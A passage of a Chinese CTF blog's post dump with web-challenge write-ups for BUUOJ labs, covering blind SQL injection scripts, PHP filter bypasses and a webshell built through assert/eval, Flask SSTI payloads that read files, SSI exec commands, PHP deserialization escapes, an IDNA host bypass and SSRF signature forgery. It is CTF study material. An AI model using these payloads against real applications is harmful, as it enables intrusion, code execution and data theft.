","link":"https://scarecr0w7.github.io/post/ctforfbctf2019rceservice/"},{"title":"WEB｜[WUSTCTF2020]颜值成绩查询","content":" 页面提示输入以查询分数，输入1，链接发现?stunum=1猜测应该是注入 http://0c6ebf06-dd69-4596-8c4b-a13e10a76d3e.node4.buuoj.cn:81/?stunum=1 输入2 输入3 输入4 最多输入到4，可以看到输出显示的内容不一样，可以利用这一点进行注入 payload： if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1)='f',1,2) 如果表名的第一个字符为f值就为1否则就为2，为1显示stunum=1页面，为2显示stunum=2页面 测试一下，没得问题 编写脚本 import requests url = 'http://0c6ebf06-dd69-4596-8c4b-a13e10a76d3e.node4.buuoj.cn:81?stunum=' str = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',',','.','@','_','-',':',';','[',']','{','}'] result = '' for i in range(1, 30): for s in str: geturl = url + &quot;if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1)='%s',1,2)&quot; % (i, s) res = requests.get(geturl) if (('Hi admin, your score is: 100' in res.text) and (res.status_code == 200)): print(s) result += s break print(result) 爆表名 if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1)='f',1,2) flag,score 爆字段 if(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),1,1)='i',1,2) flag,value 爆数据 if(substr((select(group_concat(value))from(flag)),1,1)='f',1,2) 得到flag flag{bf8bc597-fd8b-4761-a041-3684fd2e50e2} ","link":"https://scarecr0w7.github.io/post/ctforwustctf2020yan-zhi-cheng-ji-cha-xun/"},{"title":"WEB｜[MRCTF2020]套娃","content":" 查看网页源码发现代码 $query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){ die('Y0u are So cutE!'); } if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){ echo &quot;you are going to the next ~&quot;; } 查询(query)的字符串没有_或者%5f，否则die掉；GET获取的b_u_p_t不等于2333，但是必须以23333开头 所以这里需要进行绕过，可以利用php字符串的解析特性进行绕过 在解析查询字符串时会首先删除空白符，然后将将某些字符转换为下划线包括空格、.、%5f等 正则匹配中'^'和'$'代表的是行的开头和结尾，可以利用换行绕过 payload： ?b.u.p.t=23333%0a 提示flag在secrettw.php，访问secrettw.php 提示需要本地访问，使用插件修改ip访问还是失败 查看网页源码发现隐藏字符，全都是以( ) [ ] !+ 组成判断为jsfuck编码，只需要在console打印即可看到内容，CTF常见编码及特征 提示POST Merak参数 构造参数显示了隐藏的代码 &lt;?php error_reporting(0); include 'takeip.php'; ini_set('open_basedir','.'); include 'flag.php'; if(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo 'Local access only!'.&quot;&lt;br/&gt;&quot;; $ip = getIp(); if($ip!='127.0.0.1') echo &quot;Sorry,you don't have permission! Your ip is :&quot;.$ip; if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){ echo &quot;Your REQUEST is:&quot;.change($_GET['file']); echo file_get_contents(change($_GET['file'])); } ?&gt; if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){ } 条件： ip地址必须为127.0.0.1 file_get_contents($_GET['2333']) 内容必须为todat is a happy day 绕过方法： 要求本地访问请求头中添加：client-ip: 127.0.0.1 使用php伪协议绕过file_get_contents：2333=data://text/plain,todat is a happy day，因为是get请求所以伪协议内容需要编码 function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } 条件允许后可以file_get_contents(change($_GET['file']))读取flag.php，但是这里先调用了change()函数，change()函数是将获取到的参数base64解码，然后每个字符的ASCII值加当前位置*2的数，所以这里绕过只需要先减当前位置*2的数，输入后还原为flag.php &lt;?php $v = 'flag.php'; $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) - $i*2 ); } echo $re; ?&gt; fj]a&amp;f\\b base64后：ZmpdYSZmXGI= 构造请求，得到flag flag{c3ed5d3e-ff72-4c44-85bb-ec8264978fb8} ","link":"https://scarecr0w7.github.io/post/ctformrctf2020tao-wa/"},{"title":"WEB｜[极客大挑战 2019]RCE ME","content":" &lt;?php error_reporting(0); if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(&quot;This is too Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&gt; 代码意思就是GET方式传入code，code长度不能大于40，不能是大小写字母和数字，通过检测后就可以执行code 绕过这里没有想出来，看了一些wp说是将要执行的代码取反然后urlencode编码，然后在地址栏再取反，但是这个方法利用失败 ?code=(~%8F%97%8F%96%91%99%90)(); %8F%97%8F%96%91%99%90：urlencode(~'phpinfo') 后面在网上找到了其他wp payload： ?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); 构造一句话木马，使用蚊剑连接，在根目录下发现flag文件但是读取不到，还有一个readflag文件 $_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=@eval($_POST['shell']); readflag文件为二进制文件，对二进制文件反编译得到代码 int __cdecl main(int argc, const char **argv, const char **envp) { seteuid(0): setegid(0): setuid(0): setgid(0); return system(&quot;/bin/cat /flag&quot;) } 代码意思是执行这个文件就可以得到flag，但是执行phpinfo发现禁用了许多函数，所以需要绕过 这里直接使用蚁剑自带插件即可绕过 将执行命令的结果保存到文件，因为权限问题可以保存到tmp目录 /readflag &gt; /tmp/1.txt 得到flag flag{ab15a1af-32c5-49cd-9d33-d0353c0df161} 也可以使用mm0r1/exploits项目绕过 其他常见PHP代码执行绕过方法见：浅谈PHP代码执行中出现过滤限制的绕过执行方法 ","link":"https://scarecr0w7.github.io/post/ctforji-ke-da-tiao-zhan-2019rce-me/"},{"title":"WEB｜[GYCTF2020]FlaskApp","content":" 题目提示为FlaskApp，给出了三个页面，加密解密和提示，加密是对输入内容进行base64加密，解密就是对base64加密内容进行解密，提示页面没有什么实质内容，因为是flask框架所以觉得会是ssti {{2+2}} 将加密后内容进行解密，发现确实存在ssti flask ssti知识 常用payload {{[].__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen(&quot;cat flag&quot;).read()}} # __builtins__ {{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['__import__']('os').popen('cat flag').read()}} # popen {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag').read()}} # os {{().__class__.__base__.__subclasses__()[213].__init__.__globals__['os'].popen('cat flag').read()}} {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %} 但是经过测试这里过滤了很多字符，包括flag和os 先读取app.py内容 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %} black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] 发现确实是过滤了很多字符，只能通过拼接字符串来绕过 列出根目录文件 {{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}} 读取flag文件 发现flag文件，使用反向读取文件名来读取flag文件 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %} flag{d5a1e65b-233c-48cb-9acf-dde3ba54a399} 其他解法 查看其他wp发现还有其他解法，参考这里 ","link":"https://scarecr0w7.github.io/post/ctforgyctf2020flaskapp/"},{"title":"WEB｜[BSidesCF 2019]Kookie","content":" 页面提示需要以admin身份登录，并且给出了cookie的密码，看到这里应该是越权漏洞 登录cookie帐户抓包 看到数据包中有Cookie: username=cookie，尝试更改username=admin重新发包 登录成功，获得flag flag{febe78bb-526f-4c90-8b20-376a0ee775be} ","link":"https://scarecr0w7.github.io/post/ctforbsidescf-2019kookie/"},{"title":"WEB｜[0CTF 2016]piapiapia","content":" 页面有登录框判断有注入，测试后并不存在注入，查看源码也没发现什么东西，只有扫描目录备份文件 扫描目录 dirsearch -u http://0d5ebc7e-401c-4d89-8efe-c7a79a9b0086.node4.buuoj.cn:81/ -w /tools/Blasting/dictionary/php.txt -t 1 -i 200 [17:23:23] Starting: [17:23:24] 200 - 797B - /register.php [17:23:24] 200 - 0B - /config.php 经过查看/config.php页面没有内容，/register.php为注册页面 访问注册页面注册帐号登录，发现上传点 扫描备份文件 dirsearch -u http://0d5ebc7e-401c-4d89-8efe-c7a79a9b0086.node4.buuoj.cn:81/ -w /tools/Blasting/dictionary/备份.txt -t 1 -i 200 [17:27:37] Starting: [17:27:42] 200 - 392KB - /www.zip 查看备份文件，为网页源码 代码审计 流程 &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;'; } else { ?&gt; update.php上传文件和参数信息，然后将username和序列化的profile传入class.php的update_profile()函数 &lt;?php class user extends mysql{ public function update_profile($username, $new_profile) { $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = '$username'&quot;; return parent::update($this-&gt;table, 'profile', $new_profile, $where); } } ?&gt; update_profile()函数调用 filter(）对username和profile进行过滤，然后将过滤的内容更新到数据库 &lt;? php class mysql { public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); } } ?&gt; 过滤规则：将('select', 'insert', 'update', 'delete', 'where')全部替换为hacker 利用思路 &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); # 利用点 ?&gt; 可以利用profile.php文件中file_get_contents()对文件的读取，其中photo参数是数据库读取的，数据库数据是上传文件时填写后序列化的，所以可以利用反序列字符逃逸套路 &lt;?php $a = array('123', '456', '7890'); var_dump(serialize($a)); &quot;a:3:{i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;456&quot;;i:2;s:4:&quot;7890&quot;;}&quot; $b = 'a:3:{i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;456&quot;;i:2;s:5:&quot;asdfg&quot;;}&quot;;i:2;s:4:&quot;7890&quot;;}'; var_dump(unserialize($b)); array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;456&quot; [2]=&gt; string(5) &quot;asdfg&quot; } # 序列化是以;}结束，所以在其中一个值中添加;}，反序列化会提前结束 ?&gt; &lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = ''; ?&gt; config.php文件中存在flag，所以只要读取到config.php就能查看到flag 原序列化内容 a:4:{s:5:&quot;phone&quot;;s:11:&quot;18855664455&quot;;s:5:&quot;email&quot;;s:11:&quot;123@163.com&quot;;s:8:&quot;nickname&quot;;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;} payload wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 后序列化内容 a:4:{s:5:&quot;phone&quot;;s:11:&quot;18855664455&quot;;s:5:&quot;email&quot;;s:11:&quot;123@163.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;} 绕过 nickname过滤绕过：使用数组nickname[] 截断序列化内容长度问题绕过：payload长度为204，截断序列化后nickname数组0长度204，真实字符只有107，但filter()在过滤时会把where替换为hacker，hacker是六个字符比where多一个，字符便加一，where有34个所以最终204与实际长度相同 添加payload /profile.php查看源码 base64解码获取flag flag{21738702-54ec-4f8b-b9c1-164c592e6346} ","link":"https://scarecr0w7.github.io/post/ctfor0ctf-2016piapiapia/"},{"title":"WEB｜[BJDCTF2020]EasySearch","content":" 扫描发现为index.php.swp源码泄漏 &lt;?php ob_start(); function get_hash(){ $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo &quot;&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; } else { echo &quot;&lt;script&gt;alert('[!] Failed')&lt;/script&gt;&quot;; }else { *** } *** ?&gt; 代码审计-登录 if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo &quot;&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;&quot;; POST获取username参数且不为空，password md5后的前六位为6d0bc1即可登陆 编写脚本 import hashlib for i in range(1000000): password = hashlib.md5(str(i)).hexdigest() if password[0:6] == '6d0bc1': print('%d:%s') % (i, password) 2020666: 6d0bc1153791aa2b4e18b4f344f26ab4 2305004: 6d0bc1ec71a9b814677b85e3ac9c3d40 9162671: 6d0bc11ea877b37d694b38ba8a45b19c 使用任一密码登录，用户名随意，查找发现什么内容也没有 Apache SSI 远程命令执行漏洞 重新查看源码，发现存储文件后缀为shtml，可以利用Apache SSI 远程命令执行漏洞 $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; fwrite($shtml,$text); 这里是将username内容写到了shtml文件中，所以利用点在username &lt;!--#exec cmd=&quot;whoami&quot; --&gt; 访问对应的shtml文件可查看内容 最后在上级目录发现flag文件 &lt;!--#exec cmd=&quot;ls ../&quot; --&gt; flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public 读取flag文件 &lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt; 得到flag flag{973a1378-a4b8-48d0-8ff9-acf1f0434c3f} ","link":"https://scarecr0w7.github.io/post/bjdctf2020easysearch/"},{"title":"WEB｜[SUCTF 2019]Pythonginx","content":" 源码 @app.route('/getUrl', methods=['GET', 'POST']) def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == 'suctf.cc': # 解析主机名，不能是suctf.cc return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': # 分割url不能，第二部份也就是域名不能是suctf.cc return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split('.'): # 点分host newhost.append(h.encode('idna').decode('utf-8')) # 分割后的部份进行idna编码 parts[1] = '.'.join(newhost) # 去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] # 将主机名再次组合成 url host = parse.urlparse(finalUrl).hostname # 再解析主机名 if host == 'suctf.cc': # 主机名为suctf.cc return urllib.request.urlopen(finalUrl).read() # 可读取文件 else: return &quot;我扌 your problem? 333&quot; 大概意思是，获取ur主机地址不能是suctf.cc，但是分割idna重新编码后主机地址需要又是suctf.cc urlsplit, urlparse简单区别 urlsplit是拆分，而urlparse是解析，urlparse粒度更为细致 url = &quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot; urlsplit(url) scheme='https', netloc='username:password@www.baidu.com:80', path='/index.html;parameters', query='name=tom', fragment='example') urlparse(url) scheme='https', netloc='username:password@www.baidu.com:80', path='/index.html', params='parameters', query='name=tom', fragment='example' idna与utf-8编码漏洞 国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名：指部分或完全使用特殊文字&gt; 或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经&gt; 过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。 idna：支持 RFC 5891 中指定的应用程序中的国际化域名 (IDNA) 协议的库。该版本的协议通常被称为&gt; “IDNA2008”，并且可以产生与 2003 年早期标准不同的结果。 简单来说就是利用编码漏洞绕过对suctf.cc检测，某个字符串utf-8编码下不为suctf.cc，但是inda编码下为suctf.cc # ℆字符，python3进行idna编码 print('℆'.encode('idna')) b’c/u’ # 再使用utf-8进行解码 print(b'c/u'.decode('utf-8')) c/u 可使用字符 ℂ unicode: \\u2102 ℭ unicode: \\u212d Ⅽ unicode: \\u216d ⅽ unicode: \\u217d Ⓒ unicode: \\u24b8 ⓒ unicode: \\u24d2 Ｃ unicode: \\uff23 ｃ unicode: \\uff43 nginx敏感文件 配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 配置文件目录为：/usr/local/nginx/conf/nginx.conf payload 读取敏感文件，获得flag位置 getUrl?url=file://suctf.cⅭ/usr/local/nginx/conf/nginx.conf /usr/fffffflag 读取flag getUrl?url=file://suctf.cⅭ/usr/fffffflag flag{fbb5e4cb-b83e-4bec-b0d9-028de780e85b} ","link":"https://scarecr0w7.github.io/post/suctf-2019pythonginx/"},{"title":"WEB｜[BSidesCF 2019]Futurella","content":" 页面英文提示：阻止外星人！我们在垃圾箱里发现了这张纸条。我们认为它来自入侵的外星人！你能读一下吗？ 使用翻译可以翻译部份内容，也没发现什么规律 查看源码发现flag flag{ddc88d97-0505-4a91-b442-e7bd74b02358} 最后还发现，直接将所有内容复制到其他地方会看到原本文字 Resistance is futile! Bring back Futurella or we'll invade! Also, the flag is flag{ddc88d97-0505-4a91-b442-e7bd74b02358} ","link":"https://scarecr0w7.github.io/post/bsidescf-2019futurella/"},{"title":"WEB｜[De1CTF 2019]SSRF Me","content":" 页面代码为python代码，题目提示为SSRF，并且flag is in ./flag.txt 格式化代码 #! /usr/bin/env python # #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if (not os.path.exists(self.sandbox)): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print(resp) tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False # generate Sign For Action Scan. # @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route('/De1ta', methods=['GET', 'POST']) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if (waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(&quot;code.txt&quot;, &quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0', port=80) 代码审计 代码中有三个路由 @app.route('/')，读取本地code.txt文件 @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])，根据param、action和secert_key参数调用getSign()方法计算出一个值sign @app.route('/De1ta', methods=['GET', 'POST'])，获取action、param、sign和ip参数调用Task.Exec方法，扫描本地并返回结果，可以利用这里读取flag.txt文件然后输出 @app.route('/De1ta', methods=['GET', 'POST']) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if (waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) 访问/De1ta路径，传入cookies中action和sign，get方法中传入param，调用waf()函数 def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False waf()函数将param参数值转换为小写，判断是否以gopher或file字符串开头，这里需要返回Ture，调用task.Exec() def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): ...... def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False task.Exec()中判断传入的Sign是否与getSign()计算出的Sign值相同 if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print(resp) tmpfile.write(resp) tmpfile.close() result['code'] = 200 相同则，判断scan是否在action中，在则scan文件param，结果不为Connection Timeout则输出结果 所以这里需要解决的就是传入Sign值与计算的Sign值相同，并且param不以gopher或file字符串开头，action含有scan字符串。因为这里给出了Sign计算路径，且action判断用的是in，所以很好绕过，只要action含有scan字符串就行 if &quot;scan&quot; in self.action: 思路 访问/geneSign，param参数为flag.txtread，获取Sign 获取Sign：65f37c68d5eb8a857159d661f1817a15 Sign = secert_key + flag.txtread + scan 访问/De1ta，param参数为flag.txt，添加Cookie为action=readscan;sign=65f37c68d5eb8a857159d661f1817a15，sign为刚刚计算出的值 Sign = secert_key + flag.txt + readscan flag{0eea8996-266f-4d36-970d-2e5406aba2e7} 方法二：文件包含 使用urllib.urlopen(param) 包含文件，可以直接填写文件路径./flag.txt，也可以使用伪协议file:///app/flag.txt ，但是waf()禁止以file开头，可以使用local_file，使用local_file时需要注意，路径必需为绝对路径，可以使用/proc/self/cwd/代表当前路径 def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False 获取Sign # file:///app/flag.txt # local_file:flag.txt # local-file:///proc/self/cwd/flag.txt /geneSign?param=local_file:flag.txtread 627888ff16803e4bbc91c5f8113c8f9e 获取flag /De1ta?param=local_file:flag.txt cookie: action=readscan;sign=627888ff16803e4bbc91c5f8113c8f9e ","link":"https://scarecr0w7.github.io/post/de1ctf-2019ssrf-me-1/"},{"title":"WEB｜[极客大挑战 2019]FinalSQL","content":" 提示点击获取flag，依次点击可以发现注入点应该是在id，id=5提示试试id=6 id=6也没有什么特殊内容，对id进行了简单测试，发现存在过滤，fuzz一下，发现对if、and、空格和()等部分符号进行了过滤 过滤字符可使用其他字符绕过，页面存在盲注入，存在非法字符提示“你可别被我逮住了，臭弟弟”，输入错误提示“Error!”，正确提示“Clever! But not this table.” 过滤字符绕过 if elt 空格 () 编写python脚本 import requests url = 'http://decbab22-fa43-44be-a908-35d23c85e042.node4.buuoj.cn:81/search.php?id=' str = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',',','.','@','_','-',':',';','[',']','{','}'] result = '' for i in range(1, 10): for s in str: geturl = url + &quot;elt(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1)='%s',6)&quot; % (i, s) res = requests.get(geturl) if (('Clever! But not this table.' in res.text) and (res.status_code == 200)): print(s) result += s break print(result) 判断数据库名长度 elt(length(database())=n,1,0) 爆库名 elt(substr((select(database())),1,1)='a',6) geek 爆表 其中flaaaaag表为假的没有flag elt(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1)='a',6) f1nai1y,flaaaaag 爆字段 表名首字母需要大写否则爆不出来 elt(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),1,1)='i',6) id,username,password id,fl4gawsl 爆值 elt(substr((select(group_concat(password))from(F1nai1y)),1,1)='f',6) cl4y_is_really_amazing,welcome_to_my_blog,http:www.cl4y.top,http:www.cl4y.top,http:www.cl4y.top,http:www.cl4y.top,welcom_to_syclover,cl4y_really_need_a_grilfriend,flag{239a35aa-d8cf-4b5f-a743-10e6c0af53d0} ","link":"https://scarecr0w7.github.io/post/ctforji-ke-da-tiao-zhan-2019finalsql-1/"},{"title":"WEB｜[NPUCTF2020]ReadlezPHP","content":" 打开网页发现什么都没有，burpsuite抓包查看源码 发现链接 ./time.php?source，访问链接发现源码 &lt;?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); } } $c = new HelloPhp; if(isset($_GET['source'])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[&quot;data&quot;]); 2022-08-06 02:48:02 看到了unserialize，肯定就是反序列化，代码审计GET获取data参数会调用unserialize，__destruct()魔术方法中有 echo b(b(b(a);，可以利用php的动态调用方法执行命令 构造序列化数据 &lt;?php class HelloPhp { public $a='cat /flag'; public $b='system'; } $c = new HelloPhp; echo serialize($c); # O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;cat /flag&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;} 构造请求没有任何回显 O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:2:&quot;ls&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;} 换一个命令也是一样，猜测应该是system被过滤了 使用php的断言（assert），assert()可以把传入的字符串当php代码执行 O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;} 最终在phpinfo找到了flag，当然了可以执行一句话然后连接，但是失败了权限不够 flag{eefc4b80-2734-477c-b816-d3a69fd5f4b0} 